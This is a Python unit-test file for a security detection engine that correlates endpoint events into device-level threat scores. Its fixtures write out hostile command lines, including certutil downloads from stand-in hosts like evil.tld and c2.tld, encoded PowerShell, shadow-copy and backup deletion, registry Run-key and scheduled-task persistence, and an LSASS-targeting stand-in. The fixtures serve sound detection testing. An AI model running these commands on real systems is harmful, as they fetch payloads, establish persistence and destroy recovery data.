"""Unit tests for Verdict Engine v3.1 — Multi-event Correlation.

Runs under pytest OR standalone via `python test_verdict_v3_correlation.py`.
"""
from __future__ import annotations
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # /app/backend

from v2.verdict import correlate
from v2.shadow.irg import enrich as irg_enrich


# ── Helpers ─────────────────────────────────────────────────────────

def _frame(fid: str, ts: str, lane: str, label: str, cmdline: str = "",
           mitre: list[str] | None = None, action: str | None = None,
           rule_id: str | None = None, target: str | None = None) -> dict:
    return {
        "frame_iid": fid,
        "ts":        ts,
        "lane":      lane,
        "label":     label,
        "action":    action or cmdline or label,
        "cmdline":   cmdline,
        "target":    target,
        "mitre":     mitre or [],
        "rule_id":   rule_id,
    }


# ── Tests ───────────────────────────────────────────────────────────

def test_empty_frames_produces_empty_report():
    r = correlate([], case_id="none")
    assert r.case_id == "none"
    assert r.processes == {}
    assert r.device is None


def test_single_benign_event_produces_benign_process():
    frames = irg_enrich([
        _frame("f1", "2026-02-24T10:00:00Z", "process", "notepad.exe",
               cmdline="notepad.exe README.md", mitre=[]),
    ])
    r = correlate(frames, case_id="c1")
    assert r.device is not None
    assert r.device.score == 0, r.device.explanation
    assert r.device.band == "benign"
    # Every process listed, but zero signals fired.
    assert all(p.score == 0 for p in r.processes.values())


def test_signal_dedup_within_process_no_score_inflation():
    """Same signal firing on 10 events of the same process only contributes once."""
    frames = [
        _frame(f"f{i}", f"2026-02-24T10:{i:02d}:00Z", "process", "certutil.exe",
               cmdline="certutil -urlcache -split http://evil.tld/payload",
               mitre=["T1105"])
        for i in range(10)
    ]
    frames = irg_enrich(frames)
    r = correlate(frames, case_id="dedup")
    # find the certutil process aggregate
    cert = [p for p in r.processes.values() if "certutil" in p.label.lower()]
    assert cert, f"no certutil process; got {list(r.processes.keys())}"
    proc = cert[0]
    sigs = set(proc.signals)
    assert "LOLBAS_ABUSE" in sigs, sigs
    # 10 identical events — LOLBAS_ABUSE + MITRE_OTHER should each count once.
    # Score reflects unique signals, not 10× repetition.
    assert proc.score <= 60, f"score inflation detected: {proc.score}"


def test_process_chain_aggregates_across_children():
    """Office → PS → certutil chain — chain aggregate reflects ALL three."""
    frames = [
        _frame("f1", "2026-02-24T10:00:00Z", "process", "winword.exe",
               cmdline="WINWORD.EXE Invoice.docm"),
        _frame("f2", "2026-02-24T10:00:05Z", "process", "powershell.exe",
               cmdline="powershell.exe -EncodedCommand ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/",
               mitre=["T1027", "T1059"]),
        _frame("f3", "2026-02-24T10:00:10Z", "process", "certutil.exe",
               cmdline="certutil.exe -urlcache -split http://c2.tld/x.exe",
               mitre=["T1105", "T1218"]),
        _frame("f4", "2026-02-24T10:00:12Z", "file", "x.exe write",
               action="write C:\\Users\\Public\\x.exe", target="C:\\Users\\Public\\x.exe"),
        _frame("f5", "2026-02-24T10:00:15Z", "network", "beacon",
               action="beacon http://c2.tld/beacon"),
    ]
    frames = irg_enrich(frames)
    r = correlate(frames, case_id="chain")

    # Chain aggregate is stronger than any single event.
    chain_scores = [c.score for c in r.chains.values()]
    ev_scores    = [ev["score"] for ev in r.events.values()]
    assert chain_scores, "no chains produced"
    assert max(chain_scores) >= max(ev_scores), \
        f"chain score {max(chain_scores)} should ≥ max event {max(ev_scores)}"

    # Device aggregation should activate MULTI_PROCESS + CROSS_LANE bonuses.
    dev = r.device
    assert dev is not None
    bonus_keys = {b["signal"] for b in dev.correlation_bonuses}
    # cross-lane requires ≥3 lanes; we have process/file/network → yes
    assert "CROSS_LANE_ATTACK" in bonus_keys, bonus_keys
    # multi-process — ≥2 processes fired signals
    assert "MULTI_PROCESS_CORROBORATION" in bonus_keys, bonus_keys


def test_impact_chain_bonus_ransomware_progression():
    """Execution + Persistence + Impact all present → IMPACT_CHAIN bonus."""
    frames = [
        _frame("e1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
               cmdline="powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
               mitre=["T1059"]),
        _frame("e2", "2026-02-24T10:00:05Z", "registry", "reg add",
               target=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BD",
               mitre=["T1547"]),
        _frame("e3", "2026-02-24T10:00:10Z", "process", "wbadmin.exe",
               cmdline="wbadmin delete catalog -quiet",
               mitre=["T1490"], rule_id="R.impact.wbadmin.catalog_delete"),
        _frame("e4", "2026-02-24T10:00:15Z", "process", "vssadmin.exe",
               cmdline="vssadmin delete shadows /all", mitre=["T1490"]),
    ]
    frames = irg_enrich(frames)
    r = correlate(frames, case_id="ransom")
    dev = r.device
    assert dev is not None
    bonus_keys = {b["signal"] for b in dev.correlation_bonuses}
    assert "IMPACT_CHAIN" in bonus_keys, f"missing IMPACT_CHAIN in {bonus_keys}"
    assert dev.band in ("malicious", "critical"), dev.explanation


def test_family_cap_still_enforced_at_aggregate():
    """Multiple persistence signals — persistence family stays ≤ 30 at any layer."""
    frames = [
        _frame("p1", "2026-02-24T10:00:00Z", "registry", "reg add",
               target=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\A",
               mitre=["T1547"]),
        _frame("p2", "2026-02-24T10:00:01Z", "process", "schtasks.exe",
               cmdline="schtasks /create /tn t1 /tr evil.exe",
               mitre=["T1053"]),
        _frame("p3", "2026-02-24T10:00:02Z", "process", "wmic.exe",
               cmdline="wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer create",
               mitre=[]),
    ]
    frames = irg_enrich(frames)
    r = correlate(frames, case_id="cap")
    dev = r.device
    assert dev is not None
    persist_sum = sum(b["effective_weight"] for b in dev.evidence_breakdown
                      if b["family"] == "persistence")
    assert persist_sum <= 30, f"persistence cap violated at device layer: {persist_sum}"


def test_deterministic_output_across_runs():
    frames = [
        _frame("f1", "2026-02-24T10:00:00Z", "process", "winword.exe"),
        _frame("f2", "2026-02-24T10:00:05Z", "process", "powershell.exe",
               cmdline="powershell.exe -EncodedCommand ABCDEFGHIJKLMNOPQRSTUVWXYZabc",
               mitre=["T1027", "T1059"]),
        _frame("f3", "2026-02-24T10:00:10Z", "process", "certutil.exe",
               cmdline="certutil.exe -urlcache -split http://x/", mitre=["T1105"]),
    ]
    first = correlate(irg_enrich([dict(f) for f in frames]), case_id="det")
    for _ in range(50):
        r = correlate(irg_enrich([dict(f) for f in frames]), case_id="det")
        assert r.device.score == first.device.score
        assert r.device.band  == first.device.band
        assert r.device.confidence == first.device.confidence


def test_contributing_events_and_processes_populated():
    frames = [
        _frame("f1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
               cmdline="powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
               mitre=["T1027"]),
        _frame("f2", "2026-02-24T10:00:05Z", "process", "certutil.exe",
               cmdline="certutil.exe -urlcache -split http://x/",
               mitre=["T1105"]),
    ]
    frames = irg_enrich(frames)
    r = correlate(frames, case_id="c")
    dev = r.device
    assert dev.contributing_events, "device should list contributing events"
    assert dev.contributing_processes, "device should list contributing processes"
    assert len(dev.contributing_events) >= 2
    assert len(dev.contributing_processes) >= 2


def test_confidence_scales_with_evidence_density():
    """One weak signal → low confidence. Many strong signals → high confidence."""
    weak = [
        _frame("w1", "2026-02-24T10:00:00Z", "process", "unknown.exe",
               mitre=["T1082"]),
    ]
    strong = [
        _frame(f"s{i}", f"2026-02-24T10:{i:02d}:00Z", "process", exe,
               cmdline=cmd, mitre=mit, target=t)
        for i, (exe, cmd, mit, t) in enumerate([
            ("powershell.exe", "powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAA", ["T1027"], None),
            ("certutil.exe",  "certutil.exe -urlcache -split http://x/",              ["T1105"], None),
            ("wbadmin.exe",   "wbadmin delete catalog -quiet",                        ["T1490"], None),
            ("vssadmin.exe",  "vssadmin delete shadows /all",                         ["T1490"], None),
        ])
    ] + [
        _frame("s4", "2026-02-24T10:05:00Z", "registry", "reg add",
               target=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\bd",
               mitre=["T1547"]),
    ]
    r_weak   = correlate(irg_enrich(weak),   case_id="w")
    r_strong = correlate(irg_enrich(strong), case_id="s")
    assert r_strong.device.confidence > r_weak.device.confidence, \
        f"strong={r_strong.device.confidence} weak={r_weak.device.confidence}"


def test_device_score_reflects_chain_and_incident_mirrors_device():
    frames = [
        _frame("i1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
               cmdline="powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAA",
               mitre=["T1027", "T1059"]),
        _frame("i2", "2026-02-24T10:00:10Z", "process", "wbadmin.exe",
               cmdline="wbadmin delete catalog -quiet",
               mitre=["T1490"], rule_id="R.impact.wbadmin.catalog_delete"),
    ]
    frames = irg_enrich(frames)
    r = correlate(frames, case_id="di")
    assert r.device is not None and r.incident is not None
    # 1 device → incident is a 1:1 rollup (same score).
    assert r.incident.score == r.device.score
    assert r.incident.band == r.device.band


def test_multi_family_bonus_only_when_independent_corroboration():
    """Single-family, single-signal — no correlation bonus should fire."""
    frames = irg_enrich([
        _frame("only", "2026-02-24T10:00:00Z", "process", "unknown.exe",
               cmdline="unknown.exe --target lsass", mitre=["T1003"]),
    ])
    r = correlate(frames, case_id="single")
    dev = r.device
    bonus_keys = {b["signal"] for b in dev.correlation_bonuses}
    assert "MULTI_FAMILY_3" not in bonus_keys
    assert "MULTI_PROCESS_CORROBORATION" not in bonus_keys
    # Corroboration cap prevents runaway score.
    assert dev.score <= 70, dev.explanation


def test_contributing_lists_are_sorted_and_stable():
    """The contributing_events and _processes lists must be deterministically sorted."""
    frames = [
        _frame(fid, f"2026-02-24T10:00:0{i}Z", "process", "powershell.exe",
               cmdline="powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAA", mitre=["T1027"])
        for i, fid in enumerate(["zzz", "aaa", "mmm"])
    ]
    frames = irg_enrich(frames)
    r = correlate(frames, case_id="sort")
    dev = r.device
    assert dev.contributing_events == sorted(dev.contributing_events)
    assert dev.contributing_processes == sorted(dev.contributing_processes)


if __name__ == "__main__":
    fns = [(n, f) for n, f in list(globals().items()) if n.startswith("test_")]
    ok, fail = 0, 0
    for name, fn in fns:
        try:
            fn()
            print(f"  ✓ {name}")
            ok += 1
        except AssertionError as e:
            print(f"  ✗ {name} · {e}")
            fail += 1
        except Exception as e:
            print(f"  ✗ {name} · {type(e).__name__}: {e}")
            fail += 1
    print(f"\n{ok}/{ok+fail} passed")
    sys.exit(0 if fail == 0 else 1)
